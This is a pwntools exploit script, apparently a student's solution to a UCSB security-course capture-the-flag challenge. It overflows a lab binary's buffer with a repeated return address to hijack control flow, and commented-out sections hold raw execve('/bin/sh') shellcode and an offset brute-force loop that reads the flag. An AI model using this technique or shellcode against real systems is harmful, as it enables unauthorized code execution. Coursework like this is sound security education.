from pwn import *

################

# context(arch = 'i386', os = 'linux')
# context.log_level = "DEBUG"

# r = remote('cs177.seclab.cs.ucsb.edu',54824 )
# #r = process('./bin')
# r.send(asm(shellcraft.sh()))
# r.interactive()

###################

conn = remote('cs177.seclab.cs.ucsb.edu',34968)
# conn = process('./minecraft_hello.bin')
print(conn.recvuntil(b'(Mine block -1 to exit.)\n', drop=False))
conn.sendline("-1")
print(conn.recvline())
conn.sendline(b'\x56\x85\x04\x08'*19+b'b'*3)
# conn.sendline(b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+b'b'*35)
# conn.sendline(b'a'*80+p32(0x08048556)*10)
# print("send:",b'a'*44+b'c'*31+b'\x56\x85\x04\x08')
# print(conn.recvline())
# print(conn.recvline())
# print(conn.recvline())
conn.interactive()

# from pwn import *
# key=p32(0x08048556)

# print ("Brute-Force for the value starts")
# for i in range (1,81):
# 		sock=remote('cs177.seclab.cs.ucsb.edu',49351 )
# 		print(sock.recvuntil(b'(Mine block -1 to exit.)\n', drop=False))
# 		sock.sendline("-1")
# 		print(sock.recvline())
# 		sock.sendline(b'A' * i + key + b'A'*(80-i))
# 		print ("current offset",i)
# 		res = sock.recv(4096,timeout=1)
# 		print(res)
# 		res = sock.recv(4096,timeout=1)
# 		print(res)
# 		res = sock.recv(4096,timeout=1)
# 		print(res)
# 		# res = sock.recv(4096,timeout=1)
# 		# print(res)
# 		if(res==""):
# 			print ("FOUND OFFSET", i)
# 			sock.sendline("cat flag")
# 			sock.interactive()
# 			break 
# 		else:
# 			sock.close()